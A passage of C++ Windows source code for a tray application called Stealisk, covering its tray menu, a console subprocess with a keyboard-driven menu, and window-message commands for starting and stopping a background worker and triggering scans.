        WriteLog("CreateControllerTrayIcon: LoadIcon failed, using default", true);
        g_nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    }
    std::string tip = GetLangString(g_lang, "tray_tip");
    std::wstring wtip = Utf8ToWide(tip);
    if (wtip.empty()) wtip = L"Stealisk Controller";
    wcscpy_s(g_nid.szTip, wtip.c_str());
    Shell_NotifyIconW(NIM_ADD, &g_nid);
    g_trayCreated = true;
    g_controllerHwnd = hwnd;
    WriteLog("Tray icon created", true);
}

static void DestroyControllerTrayIcon() {
    if (g_trayCreated) {
        Shell_NotifyIconW(NIM_DELETE, &g_nid);
        g_trayCreated = false;
        g_controllerHwnd = NULL;
        WriteLog("Tray icon destroyed", true);
    }
}

static void ShowControllerTrayMenu(HWND hwnd) {
    HMENU hMenu = CreatePopupMenu();
    bool running = IsWorkerRunning();

    std::string toggleKey = running ? "tray_stop_service" : "tray_start_service";
    std::string toggleText = GetLangString(g_lang, toggleKey);

    AppendMenuW(hMenu, MF_STRING, ID_TRAY_TOGGLE_SERVICE, Utf8ToWide(toggleText).c_str());
    AppendMenuW(hMenu, MF_STRING, ID_TRAY_MANUAL_SCAN, Utf8ToWide(GetLangString(g_lang, "tray_start_scan")).c_str());
    AppendMenuW(hMenu, MF_STRING, ID_TRAY_EDIT_CONFIG, Utf8ToWide(GetLangString(g_lang, "tray_edit_config")).c_str());

    bool isConsoleVisible = false;
    if (g_consoleProcess) {
        DWORD exitCode;
        if (GetExitCodeProcess(g_consoleProcess, &exitCode) && exitCode == STILL_ACTIVE) {
            isConsoleVisible = g_consoleVisibleState;
        }
    }
    std::string showKey = isConsoleVisible ? "tray_hide_console" : "tray_show_console";
    AppendMenuW(hMenu, MF_STRING, ID_TRAY_SHOW_CONSOLE, Utf8ToWide(GetLangString(g_lang, showKey)).c_str());

    AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuW(hMenu, MF_STRING, ID_TRAY_EXIT, Utf8ToWide(GetLangString(g_lang, "tray_exit")).c_str());

    POINT pt;
    GetCursorPos(&pt);
    SetForegroundWindow(hwnd);
    TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
    PostMessage(hwnd, WM_NULL, 0, 0);
    DestroyMenu(hMenu);
}

// ==================== Console 辅助函数 ====================
static HWND g_consoleHwnd = NULL;
static bool g_consoleVisible = false;
static HANDLE g_consoleOut = INVALID_HANDLE_VALUE;

static void ClearConsole() {
    // 如果句柄无效，重新获取标准输出句柄
    if (g_consoleOut == INVALID_HANDLE_VALUE) {
        g_consoleOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (g_consoleOut == INVALID_HANDLE_VALUE) {
            WriteLog("ClearConsole: GetStdHandle failed, error=" + std::to_string(GetLastError()), true);
            return;
        }
    }

    CONSOLE_SCREEN_BUFFER_INFO csbi;
    if (!GetConsoleScreenBufferInfo(g_consoleOut, &csbi)) {
        DWORD err = GetLastError();
        WriteLog("ClearConsole: GetConsoleScreenBufferInfo failed, error=" + std::to_string(err), true);
        
        // 如果错误是 5 (ACCESS_DENIED)，尝试重新打开控制台输出
        if (err == 5) {
            WriteLog("ClearConsole: Access denied, trying to reopen console", true);
            // 关闭旧的句柄引用
            g_consoleOut = INVALID_HANDLE_VALUE;
            
            // 通过 CreateFile 重新打开 CONOUT$
            HANDLE hNew = CreateFileW(L"CONOUT$", GENERIC_READ | GENERIC_WRITE, 
                                      FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                      NULL, OPEN_EXISTING, 0, NULL);
            if (hNew != INVALID_HANDLE_VALUE) {
                g_consoleOut = hNew;
                WriteLog("ClearConsole: Reopened CONOUT$ successfully", true);
                
                // 重新尝试获取控制台信息
                if (GetConsoleScreenBufferInfo(g_consoleOut, &csbi)) {
                    WriteLog("ClearConsole: GetConsoleScreenBufferInfo succeeded after reopen", true);
                } else {
                    WriteLog("ClearConsole: GetConsoleScreenBufferInfo still failed after reopen, error=" + std::to_string(GetLastError()), true);
                    return;
                }
            } else {
                WriteLog("ClearConsole: Failed to reopen CONOUT$, error=" + std::to_string(GetLastError()), true);
                return;
            }
        } else {
            return;
        }
    }

    DWORD cells = static_cast<DWORD>(csbi.dwSize.X) * static_cast<DWORD>(csbi.dwSize.Y);
    COORD home = {0, 0};
    DWORD written;

    // 用空格填充整个缓冲区
    if (!FillConsoleOutputCharacterW(g_consoleOut, L' ', cells, home, &written) || written != cells) {
        WriteLog("ClearConsole: FillConsoleOutputCharacterW failed or incomplete, written=" + std::to_string(written), true);
    }

    // 恢复默认属性
    if (!FillConsoleOutputAttribute(g_consoleOut, csbi.wAttributes, cells, home, &written) || written != cells) {
        WriteLog("ClearConsole: FillConsoleOutputAttribute failed or incomplete, written=" + std::to_string(written), true);
    }

    // 重置光标到左上角
    if (!SetConsoleCursorPosition(g_consoleOut, home)) {
        WriteLog("ClearConsole: SetConsoleCursorPosition failed", true);
    }

    // 将窗口滚动到缓冲区顶部
    SMALL_RECT window = {
        0, 
        0, 
        static_cast<SHORT>(csbi.dwSize.X - 1), 
        static_cast<SHORT>(csbi.dwSize.Y - 1)
    };
    if (!SetConsoleWindowInfo(g_consoleOut, TRUE, &window)) {
        WriteLog("ClearConsole: SetConsoleWindowInfo failed", true);
    }

    WriteLog("ClearConsole: API clear succeeded", true);
}

static void ShowConsoleMenu(bool running, bool scanning) {
    if (g_consoleOut == INVALID_HANDLE_VALUE) {
        g_consoleOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (g_consoleOut == INVALID_HANDLE_VALUE) return;
    }

    std::string output;
    output += GetLangString(g_lang, "main_title", {{"app_name", g_lang.appName}}) + "\n";
    output += GetLangString(g_lang, "status_line", {{"status", running ? GetLangString(g_lang, "status_running") : GetLangString(g_lang, "status_stopped")}}) + "\n";
    std::string action = running ? GetLangString(g_lang, "action_stop") : GetLangString(g_lang, "action_start");
    output += GetLangString(g_lang, "menu_start_stop", {{"action", action}}) + "\n";
    output += GetLangString(g_lang, scanning ? "menu_stop_scan" : "menu_start_scan") + "\n";
    output += GetLangString(g_lang, "menu_edit_config") + "\n";
    output += GetLangString(g_lang, "menu_hide_console") + "\n";
    output += "\n>>> ";

    DWORD written;
    WriteConsoleA(g_consoleOut, output.c_str(), output.size(), &written, NULL);
}

static void ConsoleRefreshMenu(bool force = false) {
    if (g_consoleOut != INVALID_HANDLE_VALUE) {
        bool running = IsWorkerRunning();
        bool scanning = IsScanning();
        static bool lastRunning = false;
        static bool lastScanning = false;

        // 强制刷新或者状态变化时才刷新
        if (force || running != lastRunning || scanning != lastScanning) {
            lastRunning = running;
            lastScanning = scanning;
            ClearConsole();
            ShowConsoleMenu(running, scanning);
        }
    }
}

static void NotifyVisibilityChange() {
    HWND hCtrl = FindWindowW(L"StealiskControllerHiddenClass", NULL);
    if (hCtrl) {
        ConsoleCommand notifyCmd;
        notifyCmd.type = CMD_VISIBILITY_CHANGED;
        notifyCmd.data[0] = g_consoleVisible ? '1' : '0';
        notifyCmd.data[1] = '\0';
        COPYDATASTRUCT cds;
        cds.dwData = 1;
        cds.cbData = sizeof(notifyCmd);
        cds.lpData = &notifyCmd;
        SendMessage(hCtrl, WM_COPYDATA, (WPARAM)NULL, (LPARAM)&cds);
    }
}

static DWORD WINAPI ConsoleInputThread(LPVOID param) {
    HWND hMsgWnd = (HWND)param;
    while (true) {
        if (_kbhit()) {
            int ch = _getch();
            // 处理回车键：触发菜单刷新但不发送命令
            if (ch == 13) { // Enter key
                WriteLog("Console input: Enter key pressed, refreshing menu", true);
                g_needRefreshMenu = true;
                continue;
            }
            // 处理数字键 0-3
            if (ch >= '0' && ch <= '3') {
                int choice = ch - '0';
                WriteLog("Console input: option " + std::to_string(choice), true);
                if (choice == 3) {
                    HWND hConsole = GetConsoleWindow();
                    if (hConsole) {
                        ShowWindow(hConsole, SW_HIDE);
                        g_consoleVisible = false;
                        NotifyVisibilityChange();
                        WriteLog("Console hidden by user input (key 3)", true);
                    }
                    continue;
                }
                HWND hCtrl = FindWindowW(L"StealiskControllerHiddenClass", NULL);
                if (hCtrl) {
                    ConsoleCommand cmd;
                    switch (choice) {
                        case 0: cmd.type = CMD_TOGGLE_SERVICE; break;
                        case 1: cmd.type = CMD_SCAN; break;
                        case 2: cmd.type = CMD_EDIT_CONFIG; break;
                        default: continue;
                    }
                    strcpy_s(cmd.data, "");
                    COPYDATASTRUCT cds;
                    cds.dwData = 1;
                    cds.cbData = sizeof(cmd);
                    cds.lpData = &cmd;
                    SendMessage(hCtrl, WM_COPYDATA, (WPARAM)hMsgWnd, (LPARAM)&cds);
                } else {
                    WriteLog("Controller not found for command", true);
                }
                g_needRefreshMenu = true;
            }
            // 忽略其他按键
        }
        Sleep(100);
    }
    return 0;
}

// ==================== Console 消息窗口过程 ====================
LRESULT CALLBACK ConsoleWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            WriteLog("Console message window created", true);
            break;
        }
        case WM_COPYDATA: {
            COPYDATASTRUCT* pcds = (COPYDATASTRUCT*)lParam;
            if (pcds && pcds->dwData == 1 && pcds->cbData == sizeof(ConsoleCommand)) {
                ConsoleCommand* cmd = (ConsoleCommand*)pcds->lpData;
                switch (cmd->type) {
                    case CMD_SHOW: {
                        HWND hConsole = GetConsoleWindow();
                        if (hConsole) {
                            ShowWindow(hConsole, SW_SHOW);
                            g_consoleVisible = true;
                            NotifyVisibilityChange();
                            g_needRefreshMenu = true;
                            ConsoleRefreshMenu(true);
                            WriteLog("Console shown", true);
                        }
                        break;
                    }
                    case CMD_HIDE: {
                        HWND hConsole = GetConsoleWindow();
                        if (hConsole) {
                            ShowWindow(hConsole, SW_HIDE);
                            g_consoleVisible = false;
                            NotifyVisibilityChange();
                            WriteLog("Console hidden", true);
                        }
                        break;
                    }
                    case CMD_TOGGLE_VISIBLE: {
                        HWND hConsole = GetConsoleWindow();
                        if (hConsole) {
                            if (g_consoleVisible) {
                                ShowWindow(hConsole, SW_HIDE);
                                g_consoleVisible = false;
                            } else {
                                ShowWindow(hConsole, SW_SHOW);
                                g_consoleVisible = true;
                                g_needRefreshMenu = true;
                                ConsoleRefreshMenu(true);
                            }
                            NotifyVisibilityChange();
                            WriteLog("Console visibility toggled", true);
                        }
                        break;
                    }
                    case CMD_EXIT: {
                        PostQuitMessage(0);
                        break;
                    }
                    case CMD_UPDATE_MENU: {
                        g_needRefreshMenu = true;
                        break;
                    }
                    default:
                        break;
                }
            }
            return TRUE;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// ==================== Console 主函数 ====================
static int RunConsole() {
    SetGlobalErrorMode();
    WriteLog("Console subprocess started", true);

    Config cfg = LoadConfig();
    g_lang = InitLanguage(cfg);

    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = ConsoleWndProc;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"StealiskConsoleClass";
    RegisterClassExW(&wc);
    HWND hMsgWnd = CreateWindowExW(0, L"StealiskConsoleClass", L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
    if (!hMsgWnd) {
        WriteLog("Failed to create console message window", true);
        return 1;
    }

    AllocConsole();
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    freopen_s(&fDummy, "CONIN$", "r", stdin);
    SetConsoleTitleW(L"Stealisk Console");
    g_consoleOut = GetStdHandle(STD_OUTPUT_HANDLE);
    HWND hConsole = GetConsoleWindow();
    if (hConsole) {
        ShowWindow(hConsole, SW_SHOW);
        g_consoleVisible = true;
        NotifyVisibilityChange();
    }

    HWND hCtrl = FindWindowW(L"StealiskControllerHiddenClass", NULL);
    if (hCtrl) {
        ConsoleCommand cmd;
        cmd.type = CMD_CONSOLE_READY;
        strcpy_s(cmd.data, "");
        COPYDATASTRUCT cds;
        cds.dwData = 1;
        cds.cbData = sizeof(cmd);
        cds.lpData = &cmd;
        SendMessage(hCtrl, WM_COPYDATA, (WPARAM)hMsgWnd, (LPARAM)&cds);
        WriteLog("Console ready message sent", true);
    }

    HANDLE hThread = CreateThread(NULL, 0, ConsoleInputThread, hMsgWnd, 0, NULL);
    if (!hThread) {
        WriteLog("Failed to create input thread", true);
    }

    ConsoleRefreshMenu(true);

    MSG msg;
    int refreshCounter = 0;
    while (true) {
        DWORD ret = MsgWaitForMultipleObjects(0, NULL, FALSE, 500, QS_ALLINPUT);
        if (ret == WAIT_OBJECT_0) {
            while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
                if (msg.message == WM_QUIT) {
                    if (hThread) {
                        TerminateThread(hThread, 0);
                        CloseHandle(hThread);
                    }
                    FreeConsole();
                    WriteLog("Console exiting normally", true);
                    return 0;
                }
            }
        }
        refreshCounter++;
        if (refreshCounter >= 4 || g_needRefreshMenu.exchange(false)) {
            refreshCounter = 0;
            if (g_consoleVisible) {
                ConsoleRefreshMenu(true);
            }
        }
    }

    if (hThread) {
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
    }
    FreeConsole();
    return 0;
}

// ==================== Controller 主窗口过程 ====================
static void SendCommandToConsole(HWND hConsoleWnd, ConsoleCommandType type, const char* data = "") {
    if (!hConsoleWnd) {
        hConsoleWnd = FindWindowW(L"StealiskConsoleClass", NULL);
        if (!hConsoleWnd) {
            WriteLog("SendCommandToConsole: Console window not found", true);
            return;
        }
    }
    ConsoleCommand cmd;
    cmd.type = type;
    strncpy_s(cmd.data, data, sizeof(cmd.data) - 1);
    COPYDATASTRUCT cds;
    cds.dwData = 1;
    cds.cbData = sizeof(cmd);
    cds.lpData = &cmd;
    SendMessage(hConsoleWnd, WM_COPYDATA, (WPARAM)NULL, (LPARAM)&cds);
}

static void StartConsoleProcess(bool showWindow) {
    if (g_consoleProcess) {
        DWORD exitCode;
        if (GetExitCodeProcess(g_consoleProcess, &exitCode) && exitCode == STILL_ACTIVE) {
            if (showWindow) {
                SendCommandToConsole(NULL, CMD_SHOW);
            } else {
                SendCommandToConsole(NULL, CMD_HIDE);
            }
            return;
        }
        CloseHandle(g_consoleProcess);
        g_consoleProcess = NULL;
        g_consoleMsgWindow = NULL;
    }

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    wchar_t cmdLine[MAX_PATH + 20];
    wcscpy_s(cmdLine, exePath);
    wcscat_s(cmdLine, L" --console");
    if (CreateProcessW(exePath, cmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        g_consoleProcess = pi.hProcess;
        g_consoleMsgWindow = NULL;
        CloseHandle(pi.hThread);
        WriteLog("Console process started with independent console", true);
        if (!showWindow) {
            Sleep(500);
            SendCommandToConsole(NULL, CMD_HIDE);
        }
    } else {
        WriteLog("Failed to start console process", true);
    }
}

static void StopConsoleProcess() {
    if (g_consoleProcess) {
        HWND hConsoleWnd = FindWindowW(L"StealiskConsoleClass", NULL);
        if (hConsoleWnd) {
            SendCommandToConsole(hConsoleWnd, CMD_EXIT);
            DWORD wait = WaitForSingleObject(g_consoleProcess, StealiskConstants::CONSOLE_EXIT_WAIT_MS);
            if (wait == WAIT_TIMEOUT) {
                TerminateProcess(g_consoleProcess, 0);
                WriteLog("Console process terminated forcibly", true);
            } else {
                WriteLog("Console process exited gracefully", true);
            }
        } else {
            TerminateProcess(g_consoleProcess, 0);
        }
        CloseHandle(g_consoleProcess);
        g_consoleProcess = NULL;
        g_consoleMsgWindow = NULL;
    }
}

static void CheckConsoleProcess() {
    if (g_consoleProcess) {
        DWORD exitCode;
        if (GetExitCodeProcess(g_consoleProcess, &exitCode) && exitCode != STILL_ACTIVE) {
            WriteLog("Console process has exited, cleaning up", true);
            CloseHandle(g_consoleProcess);
            g_consoleProcess = NULL;
            g_consoleMsgWindow = NULL;
            g_consoleVisibleState = false;
        }
    }
}

LRESULT CALLBACK ControllerWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            Config cfg = LoadConfig();
            if (cfg.GetShowTray()) {
                CreateControllerTrayIcon(hwnd);
                if (g_noConsoleMode) {
                    WriteLog("No-console mode: Console not started automatically", true);
                } else {
                    StartConsoleProcess(true);
                }
            }
            break;
        }
        case WM_TRAYICON:
            if (lParam == WM_RBUTTONUP) {
                ShowControllerTrayMenu(hwnd);
            }
            break;
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case ID_TRAY_TOGGLE_SERVICE: {
                    WriteLog("Tray menu: Toggle service", true);
                    Config cfg = LoadConfig();
                    if (IsWorkerRunning()) {
                        StopWorker();
                    } else {
                        StartWorker(cfg);
                    }
                    if (g_consoleMsgWindow) {
                        SendCommandToConsole(g_consoleMsgWindow, CMD_UPDATE_MENU);
                    }
                    if (g_trayCreated) Shell_NotifyIconW(NIM_MODIFY, &g_nid);
                    break;
                }
                case ID_TRAY_MANUAL_SCAN: {
                    WriteLog("Tray menu: Manual scan", true);
                    HWND workerWnd = FindWindowW(L"StealiskWorkerHiddenClass", NULL);
                    if (workerWnd) PostMessage(workerWnd, WM_USER_SCAN, 0, 0);
                    break;
                }
                case ID_TRAY_EDIT_CONFIG: {
                    WriteLog("Tray menu: Edit config", true);
                    std::wstring configPath = GetExeDirectory() + L"\\Stealisk.ini";
                    ShellExecuteW(NULL, L"open", L"notepad.exe", configPath.c_str(), NULL, SW_SHOW);
                    break;
                }
                case ID_TRAY_SHOW_CONSOLE: {
                    WriteLog("Tray menu: Show/Hide console", true);
                    if (g_consoleProcess) {
                        DWORD exitCode;
                        if (GetExitCodeProcess(g_consoleProcess, &exitCode) && exitCode == STILL_ACTIVE) {
                            SendCommandToConsole(NULL, CMD_TOGGLE_VISIBLE);
                            break;
                        } else {
                            CloseHandle(g_consoleProcess);
                            g_consoleProcess = NULL;
                            g_consoleMsgWindow = NULL;
                        }
                    }
                    StartConsoleProcess(true);
                    break;
                }
                case ID_TRAY_EXIT: {
                    WriteLog("Tray menu: Exit program (stopping worker and controller)", true);
                    StopWorker();
                    StopConsoleProcess();
                    DestroyControllerTrayIcon();
                    PostQuitMessage(0);
                    break;
                }
            }
            break;
        case WM_COPYDATA: {
            COPYDATASTRUCT* pcds = (COPYDATASTRUCT*)lParam;
            if (pcds && pcds->dwData == 1 && pcds->cbData == sizeof(ConsoleCommand)) {
                ConsoleCommand* cmd = (ConsoleCommand*)pcds->lpData;
                g_consoleMsgWindow = (HWND)wParam;
                switch (cmd->type) {
                    case CMD_CONSOLE_READY: {
                        WriteLog("Console ready", true);
                        break;
                    }
                    case CMD_VISIBILITY_CHANGED: {
                        g_consoleVisibleState = (cmd->data[0] == '1');
                        WriteLog("Console visibility state updated: " + std::string(1, cmd->data[0]), true);
                        break;
                    }
                    case CMD_SCAN: {
                        HWND workerWnd = FindWindowW(L"StealiskWorkerHiddenClass", NULL);
                        if (workerWnd) PostMessage(workerWnd, WM_USER_SCAN, 0, 0);
                        break;
                    }
                    case CMD_TOGGLE_SERVICE: {
                        Config cfg = LoadConfig();
                        if (IsWorkerRunning()) StopWorker();
                        else StartWorker(cfg);
                        if (g_consoleMsgWindow) {
                            SendCommandToConsole(g_consoleMsgWindow, CMD_UPDATE_MENU);
                        }
                        if (g_trayCreated) Shell_NotifyIconW(NIM_MODIFY, &g_nid);
                        break;
                    }
                    case CMD_EDIT_CONFIG: {
                        std::wstring configPath = GetExeDirectory() + L"\\Stealisk.ini";
                        ShellExecuteW(NULL, L"open", L"notepad.exe", configPath.c_str(), NULL, SW_SHOW);
                        break;
                    }
                    default:
                        break;
                }
            }
            return TRUE;
        }
        case WM_DESTROY:
            StopWorker();
            StopConsoleProcess();
            DestroyControllerTrayIcon();
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

static BOOL AcquireControllerMutex() {
    g_controllerMutex = CreateMutexW(NULL, TRUE, L"Global\\Stealisk_Controller");
    if (!g_controllerMutex) return true;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(g_controllerMutex);
        g_controllerMutex = NULL;
        return false;
    }
    return true;
}

static void ReleaseControllerMutex() {
    if (g_controllerMutex) {
        ReleaseMutex(g_controllerMutex);
        CloseHandle(g_controllerMutex);
        g_controllerMutex = NULL;
    }
}

static int RunController(bool noConsoleMode = false) {
    FreeConsole();
    g_noConsoleMode = noConsoleMode;
    WriteLog(noConsoleMode ? "Controller started in NO-CONSOLE mode" : "Controller started in NORMAL mode", true);

    Config cfg = LoadConfig();
    g_lang = InitLanguage(cfg);

    if (!AcquireControllerMutex()) {
        std::string msg = GetLangString(g_lang, "error_already_running");
        std::wstring wmsg = Utf8ToWide(msg);
        MessageBoxW(NULL, wmsg.c_str(), L"Stealisk", MB_OK | MB_ICONINFORMATION);
        HWND hConsoleWnd = FindWindowW(L"StealiskConsoleClass", NULL);
        if (hConsoleWnd) SendCommandToConsole(hConsoleWnd, CMD_SHOW);
        return 1;
    }

    SetGlobalErrorMode();

    if (!cfg.GetShowTray()) {
        WriteLog("show_tray=false, controller exiting immediately", true);
        ReleaseControllerMutex();
        return 0;
    }

    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = ControllerWndProc;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"StealiskControllerHiddenClass";
    RegisterClassExW(&wc);
    HWND hwnd = CreateWindowExW(0, L"StealiskControllerHiddenClass", L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
    if (!hwnd) {
        ReleaseControllerMutex();
        return 1;
    }

    GetWorkerPath(cfg);

    if (cfg.GetAutoStartService() && !IsWorkerRunning()) {
        WriteLog("Auto-starting service", true);
        StartWorker(cfg);
    }

    MSG msg;
    while (true) {
        CheckConsoleProcess();
        DWORD ret = MsgWaitForMultipleObjects(0, NULL, FALSE, 1000, QS_ALLINPUT);
        if (ret == WAIT_OBJECT_0) {
            while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
                if (msg.message == WM_QUIT) {
                    StopWorker();
                    StopConsoleProcess();
                    DestroyControllerTrayIcon();
                    ReleaseControllerMutex();
                    WriteLog("Controller exiting normally", true);
                    return 0;
                }
            }
        }
    }

    StopWorker();
    StopConsoleProcess();
    DestroyControllerTrayIcon();
    ReleaseControllerMutex();
    return 0;
}

// ==================== 入口 ====================
int wmain(int argc, wchar_t* argv[]) {
    SetGlobalErrorMode();
    if (argc >= 2) {
        if (wcscmp(argv[1], L"--worker") == 0) return RunWorker();
        else if (wcscmp(argv[1], L"--console") == 0) return RunConsole();
        else if (wcscmp(argv[1], L"--no-console") == 0) {
            WriteLog("No-console mode: Starting Controller without Console", true);
            return RunController(true);
        }
        else {
            WriteLog("Unknown argument", true);
            return 1;
        }
    }
    try {
        return RunController(false);
    } catch (const std::exception& e) {
        std::string errMsg = std::string("Unhandled std::exception: ") + e.what();
        WriteLog(errMsg, true);
        std::wstring werr = Utf8ToWide(GetLangString(g_lang, "error_unhandled") + ": " + e.what());
        MessageBoxW(NULL, werr.c_str(), L"Stealisk Error", MB_OK | MB_ICONERROR);
        return 1;
    } catch (...) {
        WriteLog("Unknown unhandled exception", true);
        std::wstring werr = Utf8ToWide(GetLangString(g_lang, "error_unknown"));
        MessageBoxW(NULL, werr.c_str(), L"Stealisk Error", MB_OK | MB_ICONERROR);
        return 1;
    }
}